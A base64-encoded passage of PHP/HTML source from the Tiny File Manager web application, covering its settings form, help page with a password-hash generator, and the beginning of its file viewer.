DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPHNlbGVjdCBjbGFzcz0iZm9ybS1zZWxlY3QiIGlkPSJqcy1sYW5ndWFnZSIgbmFtZT0ianMtbGFuZ3VhZ2UiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiBnZXRTZWxlY3RlZCgkbCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2xvYmFsICRsYW5nOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICgkbGFuZyA9PSAkbCkgPyAnc2VsZWN0ZWQnIDogJyc7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJGxhbmdfbGlzdCBhcyAkayA9PiAkdikgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPG9wdGlvbiB2YWx1ZT0nJGsnICIuZ2V0U2VsZWN0ZWQoJGspLiI+JHY8L29wdGlvbj4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zZWxlY3Q+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im10LTMgbWItMyByb3cgIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImpzLWVycm9yLXJlcG9ydCIgY2xhc3M9ImNvbC1zbS0zIGNvbC1mb3JtLWxhYmVsIj48P3BocCBlY2hvIGxuZygnRXJyb3JSZXBvcnRpbmcnKSA/PjwvbGFiZWw+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtc20tOSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1jaGVjayBmb3JtLXN3aXRjaCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgY2xhc3M9ImZvcm0tY2hlY2staW5wdXQiIHR5cGU9ImNoZWNrYm94IiByb2xlPSJzd2l0Y2giIGlkPSJqcy1lcnJvci1yZXBvcnQiIG5hbWU9ImpzLWVycm9yLXJlcG9ydCIgdmFsdWU9InRydWUiIDw/cGhwIGVjaG8gJHJlcG9ydF9lcnJvcnMgPyAnY2hlY2tlZCcgOiAnJzsgPz4gLz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtYi0zIHJvdyI+DQogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJqcy1zaG93LWhpZGRlbiIgY2xhc3M9ImNvbC1zbS0zIGNvbC1mb3JtLWxhYmVsIj48P3BocCBlY2hvIGxuZygnU2hvd0hpZGRlbkZpbGVzJykgPz48L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXNtLTkiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tY2hlY2sgZm9ybS1zd2l0Y2giPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IGNsYXNzPSJmb3JtLWNoZWNrLWlucHV0IiB0eXBlPSJjaGVja2JveCIgcm9sZT0ic3dpdGNoIiBpZD0ianMtc2hvdy1oaWRkZW4iIG5hbWU9ImpzLXNob3ctaGlkZGVuIiB2YWx1ZT0idHJ1ZSIgPD9waHAgZWNobyAkc2hvd19oaWRkZW5fZmlsZXMgPyAnY2hlY2tlZCcgOiAnJzsgPz4gLz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtYi0zIHJvdyI+DQogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJqcy1oaWRlLWNvbHMiIGNsYXNzPSJjb2wtc20tMyBjb2wtZm9ybS1sYWJlbCI+PD9waHAgZWNobyBsbmcoJ0hpZGVDb2x1bW5zJykgPz48L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXNtLTkiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tY2hlY2sgZm9ybS1zd2l0Y2giPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IGNsYXNzPSJmb3JtLWNoZWNrLWlucHV0IiB0eXBlPSJjaGVja2JveCIgcm9sZT0ic3dpdGNoIiBpZD0ianMtaGlkZS1jb2xzIiBuYW1lPSJqcy1oaWRlLWNvbHMiIHZhbHVlPSJ0cnVlIiA8P3BocCBlY2hvICRoaWRlX0NvbHMgPyAnY2hlY2tlZCcgOiAnJzsgPz4gLz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtYi0zIHJvdyI+DQogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJqcy0zLTEiIGNsYXNzPSJjb2wtc20tMyBjb2wtZm9ybS1sYWJlbCI+PD9waHAgZWNobyBsbmcoJ1RoZW1lJykgPz48L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXNtLTUiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzZWxlY3QgY2xhc3M9ImZvcm0tc2VsZWN0IHctMTAwIiBpZD0ianMtMy0wIiBuYW1lPSJqcy10aGVtZS0zIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0nbGlnaHQnIDw/cGhwIGlmKCR0aGVtZSA9PSAibGlnaHQiKXtlY2hvICJzZWxlY3RlZCI7fSA/Pj48P3BocCBlY2hvIGxuZygnbGlnaHQnKSA/Pjwvb3B0aW9uPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSdkYXJrJyA8P3BocCBpZigkdGhlbWUgPT0gImRhcmsiKXtlY2hvICJzZWxlY3RlZCI7fSA/Pj48P3BocCBlY2hvIGxuZygnZGFyaycpID8+PC9vcHRpb24+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zZWxlY3Q+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibWItMyByb3ciPg0KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXNtLTEwIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc3VjY2VzcyI+IDxpIGNsYXNzPSJmYSBmYS1jaGVjay1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ1NhdmUnKTsgPz48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCg0KICAgICAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4NCiAgICA8P3BocA0KICAgIGZtX3Nob3dfZm9vdGVyKCk7DQogICAgZXhpdDsNCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydoZWxwJ10pKSB7DQogICAgZm1fc2hvd19oZWFkZXIoKTsgLy8gSEVBREVSDQogICAgZm1fc2hvd19uYXZfcGF0aChGTV9QQVRIKTsgLy8gY3VycmVudCBwYXRoDQogICAgZ2xvYmFsICRjZmcsICRsYW5nOw0KICAgID8+DQoNCiAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtOCBvZmZzZXQtbWQtMiBwdC0zIj4NCiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZCBtYi0yIDw/cGhwIGVjaG8gZm1fZ2V0X3RoZW1lKCk7ID8+Ij4NCiAgICAgICAgICAgIDxoNiBjbGFzcz0iY2FyZC1oZWFkZXIgZC1mbGV4IGp1c3RpZnktY29udGVudC1iZXR3ZWVuIj4NCiAgICAgICAgICAgICAgICA8c3Bhbj48aSBjbGFzcz0iZmEgZmEtZXhjbGFtYXRpb24tY2lyY2xlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdIZWxwJykgPz48L3NwYW4+DQogICAgICAgICAgICAgICAgPGEgaHJlZj0iP3A9PD9waHAgZWNobyBGTV9QQVRIID8+IiBjbGFzcz0idGV4dC1kYW5nZXIiPjxpIGNsYXNzPSJmYSBmYS10aW1lcy1jaXJjbGUtbyI+PC9pPiA8P3BocCBlY2hvIGxuZygnQ2FuY2VsJyk/PjwvYT4NCiAgICAgICAgICAgIDwvaDY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC14cy0xMiBjb2wtc20tNiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8cD48aDM+PGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL3ByYXNhdGhtYW5pL3RpbnlmaWxlbWFuYWdlciIgdGFyZ2V0PSJfYmxhbmsiIGNsYXNzPSJhcHAtdi10aXRsZSI+IFRpbnkgRmlsZSBNYW5hZ2VyIDw/cGhwIGVjaG8gVkVSU0lPTjsgPz48L2E+PC9oMz48L3A+DQogICAgICAgICAgICAgICAgICAgICAgICA8cD5BdXRob3I6IFByYXNhdGggTWFuaTwvcD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxwPk1haWwgVXM6IDxhIGhyZWY9Im1haWx0bzpjY3Bwcm9ncmFtbWVyc0BnbWFpbC5jb20iPmNjcHByb2dyYW1tZXJzW2F0XWdtYWlsLmNvbTwvYT4gPC9wPg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTEyIGNvbC1zbS02Ij4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNhcmQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx1bCBjbGFzcz0ibGlzdC1ncm91cCBsaXN0LWdyb3VwLWZsdXNoIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWdyb3VwLWl0ZW0iPjxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9wcmFzYXRobWFuaS90aW55ZmlsZW1hbmFnZXIvd2lraSIgdGFyZ2V0PSJfYmxhbmsiPjxpIGNsYXNzPSJmYSBmYS1xdWVzdGlvbi1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0hlbHAgRG9jdW1lbnRzJykgPz4gPC9hPiA8L2xpPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Imxpc3QtZ3JvdXAtaXRlbSI+PGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL3ByYXNhdGhtYW5pL3RpbnlmaWxlbWFuYWdlci9pc3N1ZXMiIHRhcmdldD0iX2JsYW5rIj48aSBjbGFzcz0iZmEgZmEtYnVnIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdSZXBvcnQgSXNzdWUnKSA/PjwvYT48L2xpPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBpZighRk1fUkVBRE9OTFkpIHsgPz4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWdyb3VwLWl0ZW0iPjxhIGhyZWY9ImphdmFzY3JpcHQ6c2hvd19uZXdfcHdkKCk7Ij48aSBjbGFzcz0iZmEgZmEtbG9jayI+PC9pPiA8P3BocCBlY2hvIGxuZygnR2VuZXJhdGUgbmV3IHBhc3N3b3JkIGhhc2gnKSA/PjwvYT48L2xpPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCB9ID8+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC91bD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cganMtbmV3LXB3ZCBoaWRkZW4gbXQtMiI+DQogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC0xMiI+DQogICAgICAgICAgICAgICAgICAgICAgICA8Zm9ybSBjbGFzcz0iZm9ybS1pbmxpbmUiIG9uc3VibWl0PSJyZXR1cm4gbmV3X3Bhc3N3b3JkX2hhc2godGhpcykiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InR5cGUiIHZhbHVlPSJwd2RoYXNoIiBhcmlhLWxhYmVsPSJoaWRkZW4iIGFyaWEtaGlkZGVuPSJ0cnVlIj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIG1iLTIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJzdGF0aWNFbWFpbDIiPjw/cGhwIGVjaG8gbG5nKCdHZW5lcmF0ZSBuZXcgcGFzc3dvcmQgaGFzaCcpID8+PC9sYWJlbD4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIG14LXNtLTMgbWItMiI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBmb3I9ImlucHV0UGFzc3dvcmQyIiBjbGFzcz0ic3Itb25seSI+PD9waHAgZWNobyBsbmcoJ1Bhc3N3b3JkJykgPz48L2xhYmVsPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCBidG4tc20iIGlkPSJpbnB1dFBhc3N3b3JkMiIgbmFtZT0iaW5wdXRQYXNzd29yZDIiIHBsYWNlaG9sZGVyPSI8P3BocCBlY2hvIGxuZygnUGFzc3dvcmQnKSA/PiIgcmVxdWlyZWQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXN1Y2Nlc3MgYnRuLXNtIG1iLTIiPjw/cGhwIGVjaG8gbG5nKCdHZW5lcmF0ZScpID8+PC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgICAgICA8L2Zvcm0+DQogICAgICAgICAgICAgICAgICAgICAgICA8dGV4dGFyZWEgY2xhc3M9ImZvcm0tY29udHJvbCIgcm93cz0iMiIgcmVhZG9ubHkgaWQ9ImpzLXB3ZC1yZXN1bHQiPjwvdGV4dGFyZWE+DQogICAgICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KICAgIDw/cGhwDQogICAgZm1fc2hvd19mb290ZXIoKTsNCiAgICBleGl0Ow0KfQ0KDQovLyBmaWxlIHZpZXdlcg0KaWYgKGlzc2V0KCRfR0VUWyd2aWV3J10pKSB7DQogICAgJGZpbGUgPSAkX0dFVFsndmlldyddOw0KICAgICRmaWxlID0gZm1fY2xlYW5fcGF0aCgkZmlsZSwgZmFsc2UpOw0KICAgICRmaWxlID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJGZpbGUpOw0KICAgIGlmICgkZmlsZSA9PSAnJyB8fCAhaXNfZmlsZSgkcGF0aCAuICcvJyAuICRmaWxlKSB8fCAhZm1faXNfZXhjbHVkZV9pdGVtcygkZmlsZSkpIHsNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0ZpbGUgbm90IGZvdW5kJyksICdlcnJvcicpOw0KICAgICAgICAkRk1fUEFUSD1GTV9QQVRIOyBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKCRGTV9QQVRIKSk7DQogICAgfQ0KDQogICAgZm1fc2hvd19oZWFkZXIoKTsgLy8gSEVBREVSDQogICAgZm1fc2hvd19uYXZfcGF0aChGTV9QQVRIKTsgLy8gY3VycmVudCBwYXRoDQoNCiAgICAkZmlsZV91cmwgPSBGTV9ST09UX1VSTCAuIGZtX2NvbnZlcnRfd2luKChGTV9QQVRIICE9ICcnID8gJy8nIC4gRk1fUEFUSCA6ICcnKSAuICcvJyAuICRmaWxlKTsNCiAgICAkZmlsZV9wYXRoID0gJHBhdGggLiAnLycgLiAkZmlsZTsNCg0KICAgICRleHQgPSBzdHJ0b2xvd2VyKHBhdGhpbmZvKCRmaWxlX3BhdGgsIFBBVEhJTkZPX0VYVEVOU0lPTikpOw0KICAgICRtaW1lX3R5cGUgPSBmbV9nZXRfbWltZV90eXBlKCRmaWxlX3BhdGgpOw0KICAgICRmaWxlc2l6ZV9yYXcgPSBmbV9nZXRfc2l6ZSgkZmlsZV9wYXRoKTsNCiAgICAkZmlsZXNpemUgPSBmbV9nZXRfZmlsZXNpemUoJGZpbGVzaXplX3Jhdyk7DQoNCiAgICAkaXNfemlwID0gZmFsc2U7DQogICAgJGlzX2d6aXAgPSBmYWxzZTsNCiAgICAkaXNfaW1hZ2UgPSBmYWxzZTsNCiAgICAkaXNfYXVkaW8gPSBmYWxzZTsNCiAgICAkaXNfdmlkZW8gPSBmYWxzZTsNCiAgICAkaXNfdGV4dCA9IGZhbHNlOw0KICAgICRpc19vbmxpbmVWaWV3ZXIgPSBmYWxzZTsNCg0KICAgICR2aWV3X3RpdGxlID0gJ0ZpbGUnOw0KICAgICRmaWxlbmFtZXMgPSBmYWxzZTsgLy8gZm9yIHppcA0KICAgICRjb250ZW50ID0gJyc7IC8vIGZvciB0ZXh0DQogICAgJG9ubGluZV92aWV3ZXIgPSBzdHJ0b2xvd2VyKEZNX0RPQ19WSUVXRVIpOw0KDQogICAgaWYoJG9ubGluZV92aWV3ZXIgJiYgJG9ubGluZV92aWV3ZXIgIT09ICdmYWxzZScgJiYgaW5fYXJyYXkoJGV4dCwgZm1fZ2V0X29ubGluZVZpZXdlcl9leHRzKCkpKXsNCiAgICAgICAgJGlzX29ubGluZVZpZXdlciA9IHRydWU7DQogICAgfQ0KICAgIGVsc2VpZiAoJGV4dCA9PSAnemlwJyB8fCAkZXh0ID09ICd0YXInKSB7DQogICAgICAgICRpc196aXAgPSB0cnVlOw0KICAgICAgICAkdmlld190aXRsZSA9ICdBcmNoaXZlJzsNCiAgICAgICAgJGZpbGVuYW1lcyA9IGZtX2dldF96aWZfaW5mbygkZmlsZV9wYXRoLCAkZXh0KTsNCiAgICB9IGVsc2VpZiAoaW5fYXJyYXkoJGV4dCwgZm1fZ2V0X2ltYWdlX2V4dHMoKSkpIHsNCiAgICAgICAgJGlzX2ltYWdlID0gdHJ1ZTsNCiAgICAgICAgJHZpZXdfdGl0bGUgPSAnSW1hZ2UnOw0KICAgIH0gZWxzZWlmIChpbl9hcnJheSgkZXh0LCBmbV9nZXRfYXVkaW9fZXh0cygpKSkgew0KICAgICAgICAkaXNfYXVkaW8gPSB0cnVlOw0KICAgICAgICAkdmlld190aXRsZSA9ICdBdWRpbyc7DQogICAgfSBlbHNlaWYgKGluX2FycmF5KCRleHQsIGZtX2dldF92aWRlb19leHRzKCkpKSB7DQogICAgICAgICRpc192aWRlbyA9IHRydWU7DQogICAgICAgICR2aWV3X3RpdGxlID0gJ1ZpZGVvJzsNCiAgICB9IGVsc2VpZiAoaW5fYXJyYXkoJGV4dCwgZm1fZ2V0X3RleHRfZXh0cygpKSB8fCBzdWJzdHIoJG1pbWVfdHlwZSwgMCwgNCkgPT0gJ3RleHQnIHx8IGluX2FycmF5KCRtaW1lX3R5cGUsIGZtX2dldF90ZXh0X21pbWVzKCkpKSB7DQogICAgICAgICRpc190ZXh0ID0gdHJ1ZTsNCiAgICAgICAgJGNvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygkZmlsZV9wYXRoKTsNCiAgICB9DQoNCiAgICA/Pg0KICAgIDxkaXYgY2xhc3M9InJvdyI+DQogICAgICAgIDxkaXYgY2xhc3M9ImNvbC0xMiI+DQogICAgICAgICAgICA8cCBjbGFzcz0iYnJlYWstd29yZCI+PGI+PD9waHAgZWNobyBsbmcoJHZpZXdfdGl0bGUpID8+ICI8P3BocCBlY2hvIGZtX2VuYyhmbV9jb252ZXJ0X3dpbigkZmlsZSkpID8+IjwvYj48L3A+DQogICAgICAgICAgICA8cCBjbGFzcz0iYnJlYWstd29yZCI+DQogICAgICAgICAgICAgICAgPD9waHAgJGRpc3BsYXlfcGF0aCA9IGZtX2dldF9kaXNwbGF5X3BhdGgoJGZpbGVfcGF0aCk7ID8+DQogICAgICAgICAgICAgICAgPHN0cm9uZz48P3BocCBlY2hvICRkaXNwbGF5X3BhdGhbJ2xhYmVsJ107ID8+Ojwvc3Ryb25nPiA8P3BocCBlY2hvICRkaXNwbGF5X3BhdGhbJ3BhdGgnXTsgPz48YnI+DQogICAgICAgICAgICAgICAgPHN0cm9uZz5GaWxlIHNpemU6PC9zdHJvbmc+IDw/cGhwIGVjaG8gKCRmaWxlc2l6ZV9yYXcgPD0gMTAwMCkgPyAiJGZpbGVzaXplX3JhdyBieXRlcyIgOiAkZmlsZXNpemU7ID8+PGJyPg0KICAgICAgICAgICAgICAgIDxzdHJvbmc+TUlNRS10eXBlOjwvc3Ryb25nPiA8P3BocCBlY2hvICRtaW1lX3R5cGUgPz48YnI+DQogICAgICAgICAgICAgICAgPD9waHANCiAgICAgICAgICAgICAgICAvLyBaSVAgaW5mbw0KICAgICAgICAgICAgICAgIGlmICgoJGlzX3ppcCB8fCAkaXNfZ3ppcCkgJiYgJGZpbGVuYW1lcyAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICAgICAgJHRvdGFsX2ZpbGVzID0gMDsNCiAgICAgICAgICAgICAgICAgICAgJHRvdGFsX2NvbXAgPSAwOw0KICAgICAgICAgICAgICAgICAgICAkdG90YWxfdW5jb21wID0gMDsNCiAgICAgICAgICAgICAgICAgICAgZm9yZWFjaCAoJGZpbGVuYW1lcyBhcyAkZm4pIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJGZuWydmb2xkZXInXSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0b3RhbF9maWxlcysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgJHRvdGFsX2NvbXAgKz0gJGZuWydjb21wcmVzc2VkX3NpemUnXTsNCiAgICAgICAgICAgICAgICAgICAgICAgICR0b3RhbF91bmNvbXAgKz0gJGZuWydmaWxlc2l6ZSddOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgID8+DQogICAgICAgICAgICAgICAgICAgIDw/cGhwIGVjaG8gbG5nKCdGaWxlcyBpbiBhcmNoaXZlJykgPz46IDw/cGhwIGVjaG8gJHRvdGFsX2ZpbGVzID8+PGJyPg0KICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvIGxuZygnVG90YWwgc2l6ZScpID8+OiA8P3BocCBlY2hvIGZtX2dldF9maWxlc2l6ZSgkdG90YWxfdW5jb21wKSA/Pjxicj4NCiAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyBsbmcoJ1NpemUgaW4gYXJjaGl2ZScpID8+OiA8P3BocCBlY2hvIGZtX2dldF9maWxlc2l6ZSgkdG90YWxfY29tcCkgPz48YnI+DQogICAgICAgICAgICAgICAgICAgIDw/cGhwIGVjaG8gbG5nKCdDb21wcmVzc2lvbicpID8+OiA8P3BocCBlY2hvIHJvdW5kKCgkdG90YWxfY29tcCAvIG1heCgkdG90YWxfdW5jb21wLCAxKSkgKiAxMDApID8+JTxicj4NCiAgICAgICAgICAgICAgICAgICAgPD9waHANCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgLy8gSW1hZ2UgaW5mbw0KICAgICAgICAgICAgICAgIGlmICgkaXNfaW1hZ2UpIHsNCiAgICAgICAgICAgICAgICAgICAgJGltYWdlX3NpemUgPSBnZXRpbWFnZXNpemUoJGZpbGVfcGF0aCk7DQogICAgICAgICAgICAgICAgICAgIGVjaG8gJzxzdHJvbmc+Jy5sbmcoJ0ltYWdlIHNpemUnKS4nOjwvc3Ryb25nPiAnIC4gKGlzc2V0KCRpbWFnZV9zaXplWzBdKSA/ICRpbWFnZV9zaXplWzBdIDogJzAnKSAuICcgeCAnIC4gKGlzc2V0KCRpbWFnZV9zaXplWzFdKSA/ICRpbWFnZV9zaXplWzFdIDogJzAnKSAuICc8YnI+JzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgLy8gVGV4dCBpbmZvDQogICAgICAgICAgICAgICAgaWYgKCRpc190ZXh0KSB7DQogICAgICAgICAgICAgICAgICAgICRpc191dGY4ID0gZm1faXNfdXRmOCgkY29udGVudCk7DQogICAgICAgICAgICAgICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoJ2ljb252JykpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghJGlzX3V0ZjgpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY29udGVudCA9IGljb252KEZNX0lDT05WX0lOUFVUX0VOQywgJ1VURi04Ly9JR05PUkUnLCAkY29udGVudCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWNobyAnPHN0cm9uZz4nLmxuZygnQ2hhcnNldCcpLic6PC9zdHJvbmc+ICcgLiAoJGlzX3V0ZjggPyAndXRmLTgnIDogJzggYml0JykgLiAnPGJyPic7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgID8+DQogICAgICAgICAgICA8L3A+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkLWZsZXggYWxpZ24taXRlbXMtY2VudGVyIG1iLTMiPg0KICAgICAgICAgICAgICAgIDxmb3JtIG1ldGhvZD0icG9zdCIgY2xhc3M9ImQtaW5saW5lIG1zLTIiIGFjdGlvbj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO2RsPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmaWxlKSA/PiI+DQogICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InRva2VuIiB2YWx1ZT0iPD9waHAgZWNobyAkX1NFU1NJT05bJ3Rva2VuJ107ID8+Ij4NCiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLWxpbmsgdGV4dC1kZWNvcmF0aW9uLW5vbmUgZnctYm9sZCBwLTAiPjxpIGNsYXNzPSJmYSBmYS1jbG91ZC1kb3dubG9hZCI+PC9pPiA8P3BocCBlY2hvIGxuZygnRG93bmxvYWQnKSA/PjwvYnV0dG9uPiAmbmJzcDsNCiAgICAgICAgICAgICAgICA8L2Zvcm0+DQogICAgICAgICAgICAgICAgPGIgY2xhc3M9Im1zLTIiPjxhIGhyZWY9Ijw/cGhwIGVjaG8gZm1fZW5jKCRmaWxlX3VybCkgPz4iIHRhcmdldD0iX2JsYW5rIj48aSBjbGFzcz0iZmEgZmEtZXh0ZXJuYWwtbGluay1zcXVhcmUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ09wZW4nKSA/PjwvYT48L2I+DQogICAgICAgICAgICAgICAgPD9waHANCiAgICAgICAgICAgICAgICAvLyBaSVAgYWN0aW9ucw0KICAgICAgICAgICAgICAgIGlmICghRk1fUkVBRE9OTFkgJiYgKCRpc196aXAgfHwgJGlzX2d6aXApICYmICRmaWxlbmFtZXMgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAgICAgICAgICR6aXBfbmFtZSA9IHBhdGhpbmZvKCRmaWxlX3BhdGgsIFBBVEhJTkZPX0ZJTEVOQU1FKTsNCiAgICAgICAgICAgICAgICAgICAgPz4NCiAgICAgICAgICAgICAgICAg